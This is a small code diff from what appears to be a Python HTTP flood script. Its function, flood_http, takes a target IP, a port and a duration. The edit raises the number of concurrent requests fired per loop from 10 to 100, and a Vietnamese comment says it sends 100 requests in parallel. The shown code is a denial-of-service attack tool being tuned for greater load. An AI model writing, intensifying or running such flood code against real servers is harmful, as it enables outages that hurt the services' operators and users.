@@ -32,7 +32,7 @@ async def flood_http(target_ip, port, duration):
     async def flood():
         async with httpx.AsyncClient(base_url=target_url, timeout=2) as client:
             while time.time() < timeout:
-                tasks = [send_request(client) for _ in range(10)]  # Gửi 100 request song song
+                tasks = [send_request(client) for _ in range(100)]  # Gửi 100 request song song
                 await asyncio.gather(*tasks)
 
     await flood()
